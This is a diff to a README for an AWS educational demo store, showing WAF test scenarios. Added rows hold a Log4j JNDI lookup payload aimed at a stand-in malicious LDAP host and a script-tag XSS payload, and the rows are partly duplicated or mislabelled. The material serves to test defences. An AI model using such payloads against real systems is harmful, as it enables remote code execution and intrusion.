@@ -1,6 +1,8 @@
 # The Recycle Bin Boutique
 The Recycle Bin Boutique is fictitious online store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS edge services. It's an educational project, that help developers in understanding the capabilities of AWS edge services. It can be used as a demo tool, and as a testing sandbox. The content of this online store , such as product names, descriptions and images are generated with the help of Anthropic's Sonnet model. The project is currently in experimental stage.
 
+In this page, you can find details on the architecture of the boutique, how to deploy it, and the different recommended test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS edge services.
+
 ![The Recycle Bin Boutique](screenshot.jpeg)
 
 # How to deploy
@@ -13,6 +15,8 @@ cd recycle-bin-boutique/store-infra
 npm install
 cdk deploy
 ```
+
+Note the generated CloudFront domain name, you will use it in the test scenarios.
 
 # Architecture
 
@@ -27,9 +31,17 @@ The backend is exposed to the internet through a CloudFront distribution and pro
 ![](rbb-diag.png)
 
 
-# Edge security testing scenarios
+# Edge security scenarios
 
-Navigate to scripts folder using the ```cd scripts``` command, then go through the different testing scenarios, and make sure that you replace the CloudFront domain name in the commands with the one in the CDK deployment output.
+The following test scenarios cover different kind of threats that can be mitigated using AWS WAF. Replace the example CloudFront domain name (xxxxxxxx.cloudfront.net) in the scenarios with the actual one generated in the CDK deployment output.
+
+| Test scenario  | Threat category  | How to test | 
+|:------------- |:--------------- | :-------------|
+| Exploit Log4j CVE | **Vulnerability exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
+| Exploit Log4j CVE | **Cross Site Scripting XSS** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
+
+| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
+| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
 
 | Threat category  | Test scenario  | How to test | 
 |:------------- |:--------------- | :-------------|
@@ -45,9 +57,9 @@ Navigate to scripts folder using the ```cd scripts``` command, then go through t
 | **Credential Stuffing** | Stolen credential detection | Use the following test _stolen credentials_ and verify that the api returns 403 block  <br/> ```WAF_TEST_CREDENTIAL@wafexample.com``` <br/> ```WAF_TEST_CREDENTIAL_PASSWORD``` |
 | **Credential Stuffing** | Password traversal detection | Using the same username, e.g. joe, login with different passwords 10-20 times until the api call returns 403 |
 | **Fake Account Creation** | Use a session to create many accounts | Try to create multiple acounts, and verify a 405 block after a few successful attempts |
-| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
 
-# Content delivery testing scenarios
+
+# Content delivery scenarios
 
 
 | Use case  | Test scenario  | How to test | 
